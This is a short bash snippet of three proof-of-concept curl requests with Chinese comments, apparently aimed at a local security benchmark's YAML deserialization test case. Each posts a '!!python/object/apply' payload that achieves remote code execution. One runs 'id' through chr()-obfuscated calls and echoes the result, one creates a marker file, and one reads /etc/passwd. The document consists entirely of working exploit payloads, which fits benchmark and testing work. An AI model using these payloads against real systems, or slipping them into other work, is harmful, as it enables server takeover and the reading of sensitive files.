```bash
# PoC 1: 命令执行并回显输出（id命令）
curl -s -X POST 'http://127.0.0.1:8443/benchmark/deserialization-00/BenchmarkTest00269' \
  --data-urlencode 'BenchmarkTest00269=!!python/object/apply:builtins.eval ["{\"text\": __import__(chr(111)+chr(115)).popen(chr(105)+chr(100)).read()}"]'

# PoC 2: 创建文件证明RCE
curl -s -X POST 'http://127.0.0.1:8443/benchmark/deserialization-00/BenchmarkTest00269' \
  -d 'BenchmarkTest00269=!!python/object/apply:os.system ["touch /tmp/pwned_yaml"]'

# PoC 3: 读取任意文件（如 /etc/passwd）
curl -s -X POST 'http://127.0.0.1:8443/benchmark/deserialization-00/BenchmarkTest00269' \
  --data-urlencode 'BenchmarkTest00269=!!python/object/apply:builtins.eval ["{\"text\": __import__(chr(111)+chr(115)).popen(\"cat /etc/passwd\").read()}"]'
```